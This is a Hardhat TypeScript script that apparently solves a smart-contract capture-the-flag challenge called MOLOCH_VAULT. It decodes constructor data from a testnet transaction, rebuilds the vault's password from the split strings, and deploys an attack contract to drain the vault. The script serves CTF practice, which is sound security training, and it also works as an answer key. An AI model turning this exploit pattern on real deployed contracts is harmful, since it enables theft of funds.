import chalk from "chalk";
import { ethers } from "hardhat";
import { MOLOCH_VAULTQuill__factory, MOLOCH_VAULTQuill, MOLOCH_VAULTQuillAttack__factory } from "../../typechain";
import { log, initialize } from "../utils";


async function main() {
    let params = "0x00000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000001000000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4000000000000000000000000ab8483f64d9c6d1ecf9b849ae677dd3315835cb20000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db00000000000000000000000000000000000000000000000000000000000001c00000000000000000000000000000000000000000000000000000000000000011424c4f4f445920504841524d414349535400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000a57484f20444f20594f5500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653455256453f0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000000054b434c45510000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009424754474a514e4750000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000115a4a515142572a4e4643504b43414b5152000000000000000000000000000000"
    // https://goerli.etherscan.io/tx/0x72049d23504379883f2dbd9265bb80ef0031beb2f3d12e18865ca4a2c7a63390
    let coder = ethers.AbiCoder.defaultAbiCoder();
    let decoded = coder.decode(["string", "string[2]", "address[3]", "string[3]"], params);
    // console.log(decoded);
    let argvs = [];
    argvs.push(decoded[0]);
    argvs.push(decoded[1].map((x: any) => x.toString()));
    argvs.push(decoded[2].map((x: any) => x.toString()));
    argvs.push(decoded[3].map((x: any) => x.toString()));
    let [molochQuillContract, attacker] = await initialize<MOLOCH_VAULTQuill>(MOLOCH_VAULTQuill__factory, undefined, argvs, "1");
    let address = await molochQuillContract.getAddress();
   
    let pass:[string, string, string] = [argvs[0],argvs[1][0].slice(0, -1),argvs[1][0].charAt(argvs[1][0].length - 1) + argvs[1][1]];
    
    let attackContract = await new MOLOCH_VAULTQuillAttack__factory(attacker).deploy();
    await attackContract.waitForDeployment();
    let tx = await attackContract.attack(address, pass, {value: 1});
    await tx.wait();
    
    log(`Is solved: ${chalk.yellow(await ethers.provider.getBalance(await attackContract.getAddress())==BigInt(2))}`);
    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});